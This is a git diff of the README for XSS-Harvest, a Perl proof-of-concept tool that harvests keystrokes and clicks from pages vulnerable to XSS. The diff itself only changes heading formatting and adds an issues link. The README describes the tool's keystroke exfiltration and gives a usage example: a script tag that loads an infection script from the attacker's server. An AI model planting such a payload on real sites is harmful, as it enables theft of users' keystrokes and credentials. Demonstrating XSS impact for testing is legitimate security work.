@@ -8,7 +8,8 @@ XSS-Harvest
 
 XSS-Harvest - a proof of concept harvesting tool for demonstrating the real power of XSS attacks
 
-## About
+About
+-----
 XSS-Harvest is multi-threaded pre-forking web server written in Perl, and requires no dependencies other than a couple of common Perl modules; you do not need a web server or database to use this tool. Before going into the detail, I'll list the high level functionality below:
 
 * Infection script adds relevant event listeners (keystrokes, onload() and mouse clicks) to the vulnerable page and sets up communication with the XSS-Harvest server.
@@ -22,7 +23,8 @@ XSS-Harvest is multi-threaded pre-forking web server written in Perl, and requir
 * Tested in IE6-9 (reflected XSS protection in IE9 will limit exploitation to stored XSS only in most cases), FF5, Chrome and various mobile browsers (Safari and Android). Please let me know your success with other browsers.
 * Overcomes browser oddities, such as Internet Explorer throttling requests to the same URL when exfiltrating keystrokes.
 
-## Dependencies
+Dependencies
+------------
 Requires the following dependencies:
 ```perl
 use HTTP::Server::Simple::CGI;
@@ -32,11 +34,13 @@ use Getopt::Std;
 use Net::Server::PreFork;
 ```
 
-### Ubuntu/Debian install
+Ubuntu/Debian install
+---------------------
 
     sudo apt-get install libhttp-server-simple-perl libdigest-md5-file-perl libtime-local-perl libnet-server-perl
 
-### OSX Install 
+OSX Install
+-----------
 
     sudo cpan install HTTP::Server::Simple::CGI
     sudo cpan install Digest::MD5
@@ -44,7 +48,8 @@ use Net::Server::PreFork;
     sudo cpan install Getopt:Std
     sudo cpan install Net::Server::Prefork
 
-## Usage
+Usage
+-----
 Start server (with redress:)
 
 ```bash
@@ -55,3 +60,6 @@ XSS:
 ```html
 <script src="http://<serverip>:<serverport>/i"></script>
 ```
+Issues
+------
+Kindly report all issues via https://github.com/cyberisltd/XSS-Harvest/issues
